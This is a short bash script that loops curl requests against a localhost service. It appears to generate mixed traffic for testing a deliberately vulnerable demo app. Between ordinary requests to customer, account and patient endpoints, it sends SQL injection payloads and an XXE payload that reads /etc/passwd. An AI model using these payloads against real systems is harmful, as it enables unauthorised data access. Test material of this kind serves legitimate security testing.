for i in {1..100}
do
    curl http://localhost:9000/customers/1
    curl http://localhost:9000/customers/
    curl http://localhost:9000/customers/2
    curl http://localhost:9000/customers/
    curl http://localhost:9000/customers/1
    curl http://localhost:9000/customers/1
    curl http://localhost:9000/customers/1
    curl http://localhost:9000/customers/1
    sleep 30
done
sleep 10
for i in {1..50}
do
    curl "http://localhost:9000/rawcustomersbyname/Joe'%20or%20'1'='1"
done
sleep 10
for i in {1..50}
do
    curl "http://localhost:9000/checkAccount/admin/Joe'%20or%20'1'='1"
done
sleep 10
for i in {1..100}
do
    curl http://localhost:9000/account
    curl http://localhost:9000/account/1
    curl http://localhost:9000/account/2
    curl http://localhost:9000/account/3
    curl http://localhost:9000/account/4
    curl http://localhost:9000/account/5
    curl http://localhost:9000/account/1
    sleep 30
done
sleep 5
for i in {1..50}
do
    curl http://localhost:9000/patients
    sleep 30
done
sleep 10
for i in {1..50}
do
    curl -X GET --header 'Content-Type: application/xml' --data '<!--?xml version="1.0"?--><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd">]><userInfo><firstName>Joe</firstName><name>&ent;</name></userInfo>' http://localhost:9000/customersXML
done